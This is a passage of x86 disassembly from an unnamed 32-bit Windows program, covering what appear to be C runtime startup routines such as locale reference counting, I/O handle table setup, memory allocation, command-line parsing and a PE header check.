  420fbe:	jne    0x4210cb
  420fc4:	mov    eax,DWORD PTR [ebp-0x20]
  420fc7:	mov    ecx,DWORD PTR [eax+0x68]
  420fca:	or     edx,0xffffffff
  420fcd:	lock xadd DWORD PTR [ecx],edx
  420fd1:	jne    0x420fe8
  420fd3:	mov    ecx,DWORD PTR [eax+0x68]
  420fd6:	cmp    ecx,0x430db0
  420fdc:	je     0x420fe8
  420fde:	push   ecx
  420fdf:	call   0x41f0cb
  420fe4:	pop    ecx
  420fe5:	mov    eax,DWORD PTR [ebp-0x20]
  420fe8:	mov    DWORD PTR [eax+0x68],ebx
  420feb:	xor    eax,eax
  420fed:	inc    eax
  420fee:	lock xadd DWORD PTR [ebx],eax
  420ff2:	mov    eax,DWORD PTR [ebp-0x20]
  420ff5:	test   BYTE PTR [eax+0x70],0x2
  420ff9:	jne    0x4210ee
  420fff:	test   BYTE PTR ds:0x4314f4,0x1
  421006:	jne    0x4210ee
  42100c:	push   0xd
  42100e:	call   0x41fabe
  421013:	pop    ecx
  421014:	mov    DWORD PTR [ebp-0x4],esi
  421017:	mov    eax,DWORD PTR [ebx+0x4]
  42101a:	mov    ds:0x43278c,eax
  42101f:	mov    eax,DWORD PTR [ebx+0x8]
  421022:	mov    ds:0x432790,eax
  421027:	mov    eax,DWORD PTR [ebx+0x21c]
  42102d:	mov    ds:0x4327a0,eax
  421032:	mov    ecx,esi
  421034:	mov    DWORD PTR [ebp-0x1c],ecx
  421037:	cmp    ecx,0x5
  42103a:	jge    0x42104c
  42103c:	mov    ax,WORD PTR [ebx+ecx*2+0xc]
  421041:	mov    WORD PTR [ecx*2+0x432794],ax
  421049:	inc    ecx
  42104a:	jmp    0x421034
  42104c:	mov    ecx,esi
  42104e:	mov    DWORD PTR [ebp-0x1c],ecx
  421051:	cmp    ecx,0x101
  421057:	jge    0x421066
  421059:	mov    al,BYTE PTR [ecx+ebx*1+0x18]
  42105d:	mov    BYTE PTR [ecx+0x430ba8],al
  421063:	inc    ecx
  421064:	jmp    0x42104e
  421066:	mov    DWORD PTR [ebp-0x1c],esi
  421069:	cmp    esi,0x100
  42106f:	jge    0x421081
  421071:	mov    al,BYTE PTR [esi+ebx*1+0x119]
  421078:	mov    BYTE PTR [esi+0x430cb0],al
  42107e:	inc    esi
  42107f:	jmp    0x421066
  421081:	mov    eax,ds:0x430fd4
  421086:	or     ecx,0xffffffff
  421089:	lock xadd DWORD PTR [eax],ecx
  42108d:	jne    0x4210a2
  42108f:	mov    eax,ds:0x430fd4
  421094:	cmp    eax,0x430db0
  421099:	je     0x4210a2
  42109b:	push   eax
  42109c:	call   0x41f0cb
  4210a1:	pop    ecx
  4210a2:	mov    DWORD PTR ds:0x430fd4,ebx
  4210a8:	xor    eax,eax
  4210aa:	inc    eax
  4210ab:	lock xadd DWORD PTR [ebx],eax
  4210af:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4210b6:	call   0x4210c0
  4210bb:	jmp    0x4210ee
  4210bd:	mov    edi,DWORD PTR [ebp+0x8]
  4210c0:	push   0xd
  4210c2:	call   0x421933
  4210c7:	pop    ecx
  4210c8:	ret    
  4210c9:	jmp    0x4210ee
  4210cb:	cmp    edi,0xffffffff
  4210ce:	jne    0x4210ee
  4210d0:	cmp    ebx,0x430db0
  4210d6:	je     0x4210df
  4210d8:	push   ebx
  4210d9:	call   0x41f0cb
  4210de:	pop    ecx
  4210df:	call   0x41fb32
  4210e4:	mov    DWORD PTR [eax],0x16
  4210ea:	jmp    0x4210ee
  4210ec:	xor    edi,edi
  4210ee:	mov    eax,edi
  4210f0:	call   0x422205
  4210f5:	ret    
  4210f6:	push   0xc
  4210f8:	push   0x42da98
  4210fd:	call   0x4221c0
  421102:	and    DWORD PTR [ebp-0x1c],0x0
  421106:	call   0x42150f
  42110b:	mov    esi,eax
  42110d:	mov    ecx,DWORD PTR ds:0x4314f4
  421113:	test   DWORD PTR [esi+0x70],ecx
  421116:	je     0x42113a
  421118:	cmp    DWORD PTR [esi+0x6c],0x0
  42111c:	je     0x42113a
  42111e:	call   0x42150f
  421123:	mov    esi,DWORD PTR [eax+0x6c]
  421126:	test   esi,esi
  421128:	jne    0x421132
  42112a:	push   0x20
  42112c:	call   0x421176
  421131:	pop    ecx
  421132:	mov    eax,esi
  421134:	call   0x422205
  421139:	ret    
  42113a:	push   0xc
  42113c:	call   0x41fabe
  421141:	pop    ecx
  421142:	and    DWORD PTR [ebp-0x4],0x0
  421146:	push   DWORD PTR ds:0x430aec
  42114c:	lea    eax,[esi+0x6c]
  42114f:	push   eax
  421150:	call   0x422219
  421155:	pop    ecx
  421156:	pop    ecx
  421157:	mov    esi,eax
  421159:	mov    DWORD PTR [ebp-0x1c],esi
  42115c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  421163:	call   0x42116d
  421168:	jmp    0x421126
  42116a:	mov    esi,DWORD PTR [ebp-0x1c]
  42116d:	push   0xc
  42116f:	call   0x421933
  421174:	pop    ecx
  421175:	ret    
  421176:	push   ebp
  421177:	mov    ebp,esp
  421179:	call   0x420cde
  42117e:	push   DWORD PTR [ebp+0x8]
  421181:	call   0x4202d3
  421186:	pop    ecx
  421187:	push   0xff
  42118c:	call   0x41f883
  421191:	int3   
  421192:	push   esi
  421193:	push   edi
  421194:	mov    esi,0x430860
  421199:	mov    edi,0x432638
  42119e:	cmp    DWORD PTR [esi+0x4],0x1
  4211a2:	jne    0x4211ba
  4211a4:	push   0x0
  4211a6:	mov    DWORD PTR [esi],edi
  4211a8:	add    edi,0x18
  4211ab:	push   0xfa0
  4211b0:	push   DWORD PTR [esi]
  4211b2:	call   0x421e72
  4211b7:	add    esp,0xc
  4211ba:	add    esi,0x8
  4211bd:	cmp    esi,0x430980
  4211c3:	jl     0x42119e
  4211c5:	xor    eax,eax
  4211c7:	pop    edi
  4211c8:	inc    eax
  4211c9:	pop    esi
  4211ca:	ret    
  4211cb:	push   ebp
  4211cc:	mov    ebp,esp
  4211ce:	push   DWORD PTR [ebp+0x8]
  4211d1:	call   0x41fa6a
  4211d6:	pop    ecx
  4211d7:	push   DWORD PTR [ebp+0x8]
  4211da:	call   DWORD PTR ds:0x42904c
  4211e0:	int3   
  4211e1:	push   0x64
  4211e3:	push   0x42da38
  4211e8:	call   0x4221c0
  4211ed:	push   0xb
  4211ef:	call   0x41fabe
  4211f4:	pop    ecx
  4211f5:	xor    ebx,ebx
  4211f7:	mov    DWORD PTR [ebp-0x4],ebx
  4211fa:	push   0x40
  4211fc:	push   0x20
  4211fe:	pop    edi
  4211ff:	push   edi
  421200:	call   0x41ef78
  421205:	pop    ecx
  421206:	pop    ecx
  421207:	mov    ecx,eax
  421209:	mov    DWORD PTR [ebp-0x24],ecx
  42120c:	test   ecx,ecx
  42120e:	jne    0x42122b
  421210:	push   0xfffffffe
  421212:	lea    eax,[ebp-0x10]
  421215:	push   eax
  421216:	push   0x4314e0
  42121b:	call   0x422760
  421220:	add    esp,0xc
  421223:	or     eax,0xffffffff
  421226:	jmp    0x421486
  42122b:	mov    ds:0x431df8,eax
  421230:	mov    DWORD PTR ds:0x433be4,edi
  421236:	add    eax,0x800
  42123b:	cmp    ecx,eax
  42123d:	jae    0x421270
  42123f:	mov    WORD PTR [ecx+0x4],0xa00
  421245:	or     DWORD PTR [ecx],0xffffffff
  421248:	mov    DWORD PTR [ecx+0x8],ebx
  42124b:	and    BYTE PTR [ecx+0x24],0x80
  42124f:	mov    al,BYTE PTR [ecx+0x24]
  421252:	and    al,0x7f
  421254:	mov    BYTE PTR [ecx+0x24],al
  421257:	mov    WORD PTR [ecx+0x25],0xa0a
  42125d:	mov    DWORD PTR [ecx+0x38],ebx
  421260:	mov    BYTE PTR [ecx+0x34],bl
  421263:	add    ecx,0x40
  421266:	mov    DWORD PTR [ebp-0x24],ecx
  421269:	mov    eax,ds:0x431df8
  42126e:	jmp    0x421236
  421270:	lea    eax,[ebp-0x74]
  421273:	push   eax
  421274:	call   DWORD PTR ds:0x429070
  42127a:	cmp    WORD PTR [ebp-0x42],0x0
  42127f:	je     0x4213b4
  421285:	mov    eax,DWORD PTR [ebp-0x40]
  421288:	test   eax,eax
  42128a:	je     0x4213b4
  421290:	mov    ecx,DWORD PTR [eax]
  421292:	mov    DWORD PTR [ebp-0x1c],ecx
  421295:	add    eax,0x4
  421298:	mov    DWORD PTR [ebp-0x28],eax
  42129b:	add    eax,ecx
  42129d:	mov    DWORD PTR [ebp-0x20],eax
  4212a0:	mov    eax,0x800
  4212a5:	cmp    ecx,eax
  4212a7:	jl     0x4212ae
  4212a9:	mov    ecx,eax
  4212ab:	mov    DWORD PTR [ebp-0x1c],ecx
  4212ae:	xor    esi,esi
  4212b0:	inc    esi
  4212b1:	mov    DWORD PTR [ebp-0x30],esi
  4212b4:	cmp    DWORD PTR ds:0x433be4,ecx
  4212ba:	jge    0x4212dc
  4212bc:	push   0x40
  4212be:	push   edi
  4212bf:	call   0x41ef78
  4212c4:	pop    ecx
  4212c5:	pop    ecx
  4212c6:	mov    ecx,eax
  4212c8:	mov    DWORD PTR [ebp-0x24],ecx
  4212cb:	test   ecx,ecx
  4212cd:	jne    0x421367
  4212d3:	mov    ecx,DWORD PTR ds:0x433be4
  4212d9:	mov    DWORD PTR [ebp-0x1c],ecx
  4212dc:	mov    edi,ebx
  4212de:	mov    DWORD PTR [ebp-0x2c],edi
  4212e1:	push   0xfffffffe
  4212e3:	pop    ebx
  4212e4:	mov    eax,DWORD PTR [ebp-0x28]
  4212e7:	mov    edx,DWORD PTR [ebp-0x20]
  4212ea:	cmp    edi,ecx
  4212ec:	jge    0x4213b7
  4212f2:	mov    esi,DWORD PTR [edx]
  4212f4:	cmp    esi,0xffffffff
  4212f7:	je     0x421354
  4212f9:	cmp    esi,ebx
  4212fb:	je     0x421354
  4212fd:	mov    al,BYTE PTR [eax]
  4212ff:	test   al,0x1
  421301:	je     0x421354
  421303:	test   al,0x8
  421305:	jne    0x421315
  421307:	push   esi
  421308:	call   DWORD PTR ds:0x429068
  42130e:	mov    edx,DWORD PTR [ebp-0x20]
  421311:	test   eax,eax
  421313:	je     0x421351
  421315:	mov    eax,edi
  421317:	sar    eax,0x5
  42131a:	mov    esi,edi
  42131c:	and    esi,0x1f
  42131f:	shl    esi,0x6
  421322:	add    esi,DWORD PTR [eax*4+0x431df8]
  421329:	mov    DWORD PTR [ebp-0x24],esi
  42132c:	mov    eax,DWORD PTR [edx]
  42132e:	mov    DWORD PTR [esi],eax
  421330:	mov    eax,DWORD PTR [ebp-0x28]
  421333:	mov    al,BYTE PTR [eax]
  421335:	mov    BYTE PTR [esi+0x4],al
  421338:	push   0x0
  42133a:	push   0xfa0
  42133f:	lea    eax,[esi+0xc]
  421342:	push   eax
  421343:	call   0x421e72
  421348:	add    esp,0xc
  42134b:	inc    DWORD PTR [esi+0x8]
  42134e:	mov    edx,DWORD PTR [ebp-0x20]
  421351:	mov    ecx,DWORD PTR [ebp-0x1c]
  421354:	inc    edi
  421355:	mov    DWORD PTR [ebp-0x2c],edi
  421358:	mov    eax,DWORD PTR [ebp-0x28]
  42135b:	inc    eax
  42135c:	mov    DWORD PTR [ebp-0x28],eax
  42135f:	add    edx,0x4
  421362:	mov    DWORD PTR [ebp-0x20],edx
  421365:	jmp    0x4212ea
  421367:	mov    DWORD PTR [esi*4+0x431df8],ecx
  42136e:	add    DWORD PTR ds:0x433be4,edi
  421374:	mov    eax,DWORD PTR [esi*4+0x431df8]
  42137b:	add    eax,0x800
  421380:	cmp    ecx,eax
  421382:	jae    0x4213a8
  421384:	mov    WORD PTR [ecx+0x4],0xa00
  42138a:	or     DWORD PTR [ecx],0xffffffff
  42138d:	mov    DWORD PTR [ecx+0x8],ebx
  421390:	and    BYTE PTR [ecx+0x24],0x80
  421394:	mov    WORD PTR [ecx+0x25],0xa0a
  42139a:	mov    DWORD PTR [ecx+0x38],ebx
  42139d:	mov    BYTE PTR [ecx+0x34],bl
  4213a0:	add    ecx,0x40
  4213a3:	mov    DWORD PTR [ebp-0x24],ecx
  4213a6:	jmp    0x421374
  4213a8:	inc    esi
  4213a9:	mov    DWORD PTR [ebp-0x30],esi
  4213ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4213af:	jmp    0x4212b4
  4213b4:	push   0xfffffffe
  4213b6:	pop    ebx
  4213b7:	xor    edi,edi
  4213b9:	mov    DWORD PTR [ebp-0x2c],edi
  4213bc:	cmp    edi,0x3
  4213bf:	jge    0x42147c
  4213c5:	mov    esi,edi
  4213c7:	shl    esi,0x6
  4213ca:	add    esi,DWORD PTR ds:0x431df8
  4213d0:	mov    DWORD PTR [ebp-0x24],esi
  4213d3:	cmp    DWORD PTR [esi],0xffffffff
  4213d6:	je     0x4213ea
  4213d8:	cmp    DWORD PTR [esi],ebx
  4213da:	je     0x4213ea
  4213dc:	movsx  eax,BYTE PTR [esi+0x4]
  4213e0:	or     al,0x80
  4213e2:	mov    BYTE PTR [esi+0x4],al
  4213e5:	jmp    0x421476
  4213ea:	mov    BYTE PTR [esi+0x4],0x81
  4213ee:	test   edi,edi
  4213f0:	jne    0x4213f7
  4213f2:	push   0xfffffff6
  4213f4:	pop    eax
  4213f5:	jmp    0x421401
  4213f7:	lea    eax,[edi-0x1]
  4213fa:	neg    eax
  4213fc:	sbb    eax,eax
  4213fe:	add    eax,0xfffffff5
  421401:	push   eax
  421402:	call   DWORD PTR ds:0x429064
  421408:	mov    DWORD PTR [ebp-0x1c],eax
  42140b:	cmp    eax,0xffffffff
  42140e:	je     0x42145c
  421410:	test   eax,eax
  421412:	je     0x42145c
  421414:	push   eax
  421415:	call   DWORD PTR ds:0x429068
  42141b:	test   eax,eax
  42141d:	je     0x42145c
  42141f:	mov    ecx,DWORD PTR [ebp-0x1c]
  421422:	mov    DWORD PTR [esi],ecx
  421424:	and    eax,0xff
  421429:	cmp    eax,0x2
  42142c:	jne    0x421436
  42142e:	movsx  eax,BYTE PTR [esi+0x4]
  421432:	or     al,0x40
  421434:	jmp    0x421441
  421436:	cmp    eax,0x3
  421439:	jne    0x421444
  42143b:	movsx  eax,BYTE PTR [esi+0x4]
  42143f:	or     al,0x8
  421441:	mov    BYTE PTR [esi+0x4],al
  421444:	push   0x0
  421446:	push   0xfa0
  42144b:	lea    eax,[esi+0xc]
  42144e:	push   eax
  42144f:	call   0x421e72
  421454:	add    esp,0xc
  421457:	inc    DWORD PTR [esi+0x8]
  42145a:	jmp    0x421476
  42145c:	movsx  eax,BYTE PTR [esi+0x4]
  421460:	or     al,0x40
  421462:	mov    BYTE PTR [esi+0x4],al
  421465:	mov    DWORD PTR [esi],ebx
  421467:	mov    eax,ds:0x433b40
  42146c:	test   eax,eax
  42146e:	je     0x421476
  421470:	mov    eax,DWORD PTR [eax+edi*4]
  421473:	mov    DWORD PTR [eax+0x10],ebx
  421476:	inc    edi
  421477:	jmp    0x4213b9
  42147c:	mov    DWORD PTR [ebp-0x4],ebx
  42147f:	call   0x42148c
  421484:	xor    eax,eax
  421486:	call   0x422205
  42148b:	ret    
  42148c:	push   0xb
  42148e:	call   0x421933
  421493:	pop    ecx
  421494:	ret    
  421495:	push   ebp
  421496:	mov    ebp,esp
  421498:	push   esi
  421499:	mov    esi,DWORD PTR [ebp+0x8]
  42149c:	test   esi,esi
  42149e:	je     0x4214bb
  4214a0:	push   0xffffffe0
  4214a2:	xor    edx,edx
  4214a4:	pop    eax
  4214a5:	div    esi
  4214a7:	cmp    eax,DWORD PTR [ebp+0xc]
  4214aa:	jae    0x4214bb
  4214ac:	call   0x41fb32
  4214b1:	mov    DWORD PTR [eax],0xc
  4214b7:	xor    eax,eax
  4214b9:	jmp    0x42150c
  4214bb:	imul   esi,DWORD PTR [ebp+0xc]
  4214bf:	test   esi,esi
  4214c1:	jne    0x4214c4
  4214c3:	inc    esi
  4214c4:	xor    ecx,ecx
  4214c6:	cmp    esi,0xffffffe0
  4214c9:	ja     0x4214e0
  4214cb:	push   esi
  4214cc:	push   0x8
  4214ce:	push   DWORD PTR ds:0x431df0
  4214d4:	call   DWORD PTR ds:0x4290f0
  4214da:	mov    ecx,eax
  4214dc:	test   ecx,ecx
  4214de:	jne    0x42150a
  4214e0:	cmp    DWORD PTR ds:0x432b18,0x0
  4214e7:	je     0x4214fd
  4214e9:	push   esi
  4214ea:	call   0x41feca
  4214ef:	pop    ecx
  4214f0:	test   eax,eax
  4214f2:	jne    0x4214c4
  4214f4:	mov    eax,DWORD PTR [ebp+0x10]
  4214f7:	test   eax,eax
  4214f9:	je     0x4214b7
  4214fb:	jmp    0x4214b1
  4214fd:	mov    eax,DWORD PTR [ebp+0x10]
  421500:	test   eax,eax
  421502:	je     0x42150a
  421504:	mov    DWORD PTR [eax],0xc
  42150a:	mov    eax,ecx
  42150c:	pop    esi
  42150d:	pop    ebp
  42150e:	ret    
  42150f:	push   esi
  421510:	call   0x420bdf
  421515:	mov    esi,eax
  421517:	test   esi,esi
  421519:	jne    0x421523
  42151b:	push   0x10
  42151d:	call   0x421176
  421522:	pop    ecx
  421523:	mov    eax,esi
  421525:	pop    esi
  421526:	ret    
  421527:	push   0x2
  421529:	call   0x421176
  42152e:	pop    ecx
  42152f:	ret    
  421530:	push   esi
  421531:	push   edi
  421532:	xor    edi,edi
  421534:	cmp    DWORD PTR ds:0x433bf4,edi
  42153a:	jne    0x421541
  42153c:	call   0x41ef5a
  421541:	mov    esi,DWORD PTR ds:0x433bfc
  421547:	test   esi,esi
  421549:	jne    0x421550
  42154b:	mov    esi,0x42ac2c
  421550:	mov    cl,BYTE PTR [esi]
  421552:	cmp    cl,0x20
  421555:	ja     0x42155f
  421557:	test   cl,cl
  421559:	je     0x42158a
  42155b:	test   edi,edi
  42155d:	je     0x421584
  42155f:	cmp    cl,0x22
  421562:	jne    0x42156d
  421564:	xor    eax,eax
  421566:	test   edi,edi
  421568:	sete   al
  42156b:	mov    edi,eax
  42156d:	movzx  eax,cl
  421570:	push   eax
  421571:	call   0x41f295
  421576:	pop    ecx
  421577:	test   eax,eax
  421579:	je     0x42157c
  42157b:	inc    esi
  42157c:	inc    esi
  42157d:	jmp    0x421550
  42157f:	cmp    al,0x20
  421581:	ja     0x42158a
  421583:	inc    esi
  421584:	mov    al,BYTE PTR [esi]
  421586:	test   al,al
  421588:	jne    0x42157f
  42158a:	pop    edi
  42158b:	mov    eax,esi
  42158d:	pop    esi
  42158e:	ret    
  42158f:	push   ebp
  421590:	mov    ebp,esp
  421592:	mov    eax,DWORD PTR [ebp+0x8]
  421595:	mov    ds:0x4327b0,eax
  42159a:	pop    ebp
  42159b:	ret    
  42159c:	push   ebp
  42159d:	mov    ebp,esp
  42159f:	push   esi
  4215a0:	push   edi
  4215a1:	xor    esi,esi
  4215a3:	push   DWORD PTR [ebp+0xc]
  4215a6:	push   DWORD PTR [ebp+0x8]
  4215a9:	call   0x420d17
  4215ae:	mov    edi,eax
  4215b0:	pop    ecx
  4215b1:	pop    ecx
  4215b2:	test   edi,edi
  4215b4:	jne    0x4215e0
  4215b6:	cmp    DWORD PTR [ebp+0xc],eax
  4215b9:	je     0x4215e0
  4215bb:	cmp    DWORD PTR ds:0x432788,eax
  4215c1:	jbe    0x4215e0
  4215c3:	push   esi
  4215c4:	call   0x422179
  4215c9:	add    esi,0x3e8
  4215cf:	pop    ecx
  4215d0:	cmp    esi,DWORD PTR ds:0x432788
  4215d6:	jbe    0x4215db
  4215d8:	or     esi,0xffffffff
  4215db:	cmp    esi,0xffffffff
  4215de:	jne    0x4215a3
  4215e0:	mov    eax,edi
  4215e2:	pop    edi
  4215e3:	pop    esi
  4215e4:	pop    ebp
  4215e5:	ret    
  4215e6:	push   0x1
  4215e8:	push   0x0
  4215ea:	push   0x0
  4215ec:	call   0x421af5
  4215f1:	add    esp,0xc
  4215f4:	ret    
  4215f5:	push   ebp
  4215f6:	mov    ebp,esp
  4215f8:	sub    esp,0x10
  4215fb:	push   DWORD PTR [ebp+0x8]
  4215fe:	lea    ecx,[ebp-0x10]
  421601:	call   0x4207b2
  421606:	push   DWORD PTR [ebp+0x28]
  421609:	lea    eax,[ebp-0x10]
  42160c:	push   DWORD PTR [ebp+0x24]
  42160f:	push   DWORD PTR [ebp+0x20]
  421612:	push   DWORD PTR [ebp+0x1c]
  421615:	push   DWORD PTR [ebp+0x18]
  421618:	push   DWORD PTR [ebp+0x14]
  42161b:	push   DWORD PTR [ebp+0x10]
  42161e:	push   DWORD PTR [ebp+0xc]
  421621:	push   eax
  421622:	call   0x422e90
  421627:	add    esp,0x24
  42162a:	cmp    BYTE PTR [ebp-0x4],0x0
  42162e:	je     0x421637
  421630:	mov    ecx,DWORD PTR [ebp-0x8]
  421633:	and    DWORD PTR [ecx+0x70],0xfffffffd
  421637:	mov    esp,ebp
  421639:	pop    ebp
  42163a:	ret    
  42163b:	push   ebp
  42163c:	mov    ebp,esp
  42163e:	push   esi
  42163f:	mov    esi,DWORD PTR [ebp+0x8]
  421642:	test   esi,esi
  421644:	je     0x42169f
  421646:	mov    eax,DWORD PTR [esi]
  421648:	cmp    eax,DWORD PTR ds:0x431500
  42164e:	je     0x421657
  421650:	push   eax
  421651:	call   0x41f0cb
  421656:	pop    ecx
  421657:	mov    eax,DWORD PTR [esi+0x4]
  42165a:	cmp    eax,DWORD PTR ds:0x431504
  421660:	je     0x421669
  421662:	push   eax
  421663:	call   0x41f0cb
  421668:	pop    ecx
  421669:	mov    eax,DWORD PTR [esi+0x8]
  42166c:	cmp    eax,DWORD PTR ds:0x431508
  421672:	je     0x42167b
  421674:	push   eax
  421675:	call   0x41f0cb
  42167a:	pop    ecx
  42167b:	mov    eax,DWORD PTR [esi+0x30]
  42167e:	cmp    eax,DWORD PTR ds:0x431530
  421684:	je     0x42168d
  421686:	push   eax
  421687:	call   0x41f0cb
  42168c:	pop    ecx
  42168d:	mov    eax,DWORD PTR [esi+0x34]
  421690:	cmp    eax,DWORD PTR ds:0x431534
  421696:	je     0x42169f
  421698:	push   eax
  421699:	call   0x41f0cb
  42169e:	pop    ecx
  42169f:	pop    esi
  4216a0:	pop    ebp
  4216a1:	ret    
  4216a2:	push   ebp
  4216a3:	mov    ebp,esp
  4216a5:	sub    esp,0x18
  4216a8:	lea    ecx,[ebp-0x18]
  4216ab:	push   ebx
  4216ac:	push   DWORD PTR [ebp+0x10]
  4216af:	call   0x4207b2
  4216b4:	mov    ebx,DWORD PTR [ebp+0x8]
  4216b7:	lea    eax,[ebx+0x1]
  4216ba:	cmp    eax,0x100
  4216bf:	ja     0x4216d0
  4216c1:	mov    eax,DWORD PTR [ebp-0x18]
  4216c4:	mov    eax,DWORD PTR [eax+0x90]
  4216ca:	movzx  eax,WORD PTR [eax+ebx*2]
  4216ce:	jmp    0x42173e
  4216d0:	mov    eax,ebx
  4216d2:	lea    ecx,[ebp-0x18]
  4216d5:	sar    eax,0x8
  4216d8:	mov    DWORD PTR [ebp+0x8],eax
  4216db:	push   ecx
  4216dc:	movzx  eax,al
  4216df:	push   eax
  4216e0:	call   0x4218f9
  4216e5:	pop    ecx
  4216e6:	pop    ecx
  4216e7:	test   eax,eax
  4216e9:	je     0x4216fd
  4216eb:	mov    eax,DWORD PTR [ebp+0x8]
  4216ee:	push   0x2
  4216f0:	mov    BYTE PTR [ebp-0x8],al
  4216f3:	mov    BYTE PTR [ebp-0x7],bl
  4216f6:	mov    BYTE PTR [ebp-0x6],0x0
  4216fa:	pop    ecx
  4216fb:	jmp    0x421707
  4216fd:	xor    ecx,ecx
  4216ff:	mov    BYTE PTR [ebp-0x8],bl
  421702:	mov    BYTE PTR [ebp-0x7],0x0
  421706:	inc    ecx
  421707:	mov    eax,DWORD PTR [ebp-0x18]
  42170a:	push   0x1
  42170c:	push   DWORD PTR [eax+0x4]
  42170f:	lea    eax,[ebp-0x4]
  421712:	push   eax
  421713:	push   ecx
  421714:	lea    eax,[ebp-0x8]
  421717:	push   eax
  421718:	lea    eax,[ebp-0x18]
  42171b:	push   0x1
  42171d:	push   eax
  42171e:	call   0x41faf2
  421723:	add    esp,0x1c
  421726:	test   eax,eax
  421728:	jne    0x42173a
  42172a:	cmp    BYTE PTR [ebp-0xc],al
  42172d:	je     0x421736
  42172f:	mov    eax,DWORD PTR [ebp-0x10]
  421732:	and    DWORD PTR [eax+0x70],0xfffffffd
  421736:	xor    eax,eax
  421738:	jmp    0x42174e
  42173a:	movzx  eax,WORD PTR [ebp-0x4]
  42173e:	and    eax,DWORD PTR [ebp+0xc]
  421741:	cmp    BYTE PTR [ebp-0xc],0x0
  421745:	je     0x42174e
  421747:	mov    ecx,DWORD PTR [ebp-0x10]
  42174a:	and    DWORD PTR [ecx+0x70],0xfffffffd
  42174e:	pop    ebx
  42174f:	mov    esp,ebp
  421751:	pop    ebp
  421752:	ret    
  421753:	push   ebp
  421754:	mov    ebp,esp
  421756:	cmp    DWORD PTR [ebp+0x8],0x0
  42175a:	jne    0x421771
  42175c:	call   0x41fb32
  421761:	mov    DWORD PTR [eax],0x16
  421767:	call   0x422622
  42176c:	or     eax,0xffffffff
  42176f:	pop    ebp
  421770:	ret    
  421771:	push   DWORD PTR [ebp+0x8]
  421774:	push   0x0
  421776:	push   DWORD PTR ds:0x431df0
  42177c:	call   DWORD PTR ds:0x4290fc
  421782:	pop    ebp
  421783:	ret    
  421784:	mov    eax,ds:0x430810
  421789:	cmp    eax,0xffffffff
  42178c:	je     0x42179c
  42178e:	push   eax
  42178f:	call   0x421def
  421794:	or     DWORD PTR ds:0x430810,0xffffffff
  42179b:	pop    ecx
  42179c:	jmp    0x421824
  4217a1:	push   DWORD PTR ds:0x4327bc
  4217a7:	call   DWORD PTR ds:0x429048
  4217ad:	ret    
  4217ae:	call   0x4218c1
  4217b3:	call   0x421192
  4217b8:	test   eax,eax
  4217ba:	jne    0x4217c4
  4217bc:	call   0x421784
  4217c1:	xor    eax,eax
  4217c3:	ret    
  4217c4:	push   0x42083a
  4217c9:	call   0x421dd1
  4217ce:	mov    ds:0x430810,eax
  4217d3:	pop    ecx
  4217d4:	cmp    eax,0xffffffff
  4217d7:	je     0x4217bc
  4217d9:	push   esi
  4217da:	push   0x3bc
  4217df:	push   0x1
  4217e1:	call   0x41ef78
  4217e6:	mov    esi,eax
  4217e8:	pop    ecx
  4217e9:	pop    ecx
  4217ea:	test   esi,esi
  4217ec:	je     0x42181b
  4217ee:	push   esi
  4217ef:	push   DWORD PTR ds:0x430810
  4217f5:	call   0x421e2d
  4217fa:	pop    ecx
  4217fb:	pop    ecx
  4217fc:	test   eax,eax
  4217fe:	je     0x42181b
  421800:	push   0x0
  421802:	push   esi
  421803:	call   0x41f1ae
  421808:	pop    ecx
  421809:	pop    ecx
  42180a:	call   DWORD PTR ds:0x429040
  421810:	or     DWORD PTR [esi+0x4],0xffffffff
  421814:	mov    DWORD PTR [esi],eax
  421816:	xor    eax,eax
  421818:	inc    eax
  421819:	pop    esi
  42181a:	ret    
  42181b:	call   0x421784
  421820:	xor    eax,eax
  421822:	pop    esi
  421823:	ret    
  421824:	push   esi
  421825:	push   edi
  421826:	mov    esi,0x430860
  42182b:	mov    edi,esi
  42182d:	push   ebx
  42182e:	mov    ebx,DWORD PTR [edi]
  421830:	test   ebx,ebx
  421832:	je     0x42184b
  421834:	cmp    DWORD PTR [edi+0x4],0x1
  421838:	je     0x42184b
  42183a:	push   ebx
  42183b:	call   DWORD PTR ds:0x42906c
  421841:	push   ebx
  421842:	call   0x41f0cb
  421847:	and    DWORD PTR [edi],0x0
  42184a:	pop    ecx
  42184b:	add    edi,0x8
  42184e:	cmp    edi,0x430980
  421854:	jl     0x42182e
  421856:	pop    ebx
  421857:	cmp    DWORD PTR [esi],0x0
  42185a:	je     0x42186a
  42185c:	cmp    DWORD PTR [esi+0x4],0x1
  421860:	jne    0x42186a
  421862:	push   DWORD PTR [esi]
  421864:	call   DWORD PTR ds:0x42906c
  42186a:	add    esi,0x8
  42186d:	cmp    esi,0x430980
  421873:	jl     0x421857
  421875:	pop    edi
  421876:	pop    esi
  421877:	ret    
  421878:	cmp    ecx,DWORD PTR ds:0x4314e0
  42187e:	jne    0x421882
  421880:	repz ret 
  421882:	jmp    0x420dc2
  421887:	int3   
  421888:	int3   
  421889:	int3   
  42188a:	int3   
  42188b:	int3   
  42188c:	int3   
  42188d:	int3   
  42188e:	int3   
  42188f:	int3   
  421890:	push   ebp
  421891:	mov    ebp,esp
  421893:	mov    eax,DWORD PTR [ebp+0x8]
  421896:	mov    ecx,0x5a4d
  42189b:	cmp    WORD PTR [eax],cx
  42189e:	je     0x4218a4
  4218a0:	xor    eax,eax
  4218a2:	pop    ebp
  4218a3:	ret    
  4218a4:	mov    ecx,DWORD PTR [eax+0x3c]
  4218a7:	add    ecx,eax
  4218a9:	xor    eax,eax
  4218ab:	cmp    DWORD PTR [ecx],0x4550
  4218b1:	jne    0x4218bf
  4218b3:	mov    edx,0x10b
  4218b8:	cmp    WORD PTR [ecx+0x18],dx
  4218bc:	sete   al
  4218bf:	pop    ebp
  4218c0:	ret    
  4218c1:	push   esi
  4218c2:	push   0x0
  4218c4:	call   DWORD PTR ds:0x429044
  4218ca:	mov    esi,eax
  4218cc:	push   esi
  4218cd:	call   0x420f41
  4218d2:	push   esi
  4218d3:	call   0x4206c4
  4218d8:	push   esi
  4218d9:	call   0x42158f
  4218de:	push   esi
  4218df:	call   0x41f9ac
  4218e4:	push   esi
  4218e5:	call   0x41fb70
  4218ea:	push   esi
  4218eb:	call   0x41f103
  4218f0:	add    esp,0x18
  4218f3:	pop    esi
  4218f4:	jmp    0x421ee0
  4218f9:	push   ebp
  4218fa:	mov    ebp,esp
  4218fc:	sub    esp,0x10
  4218ff:	push   DWORD PTR [ebp+0xc]
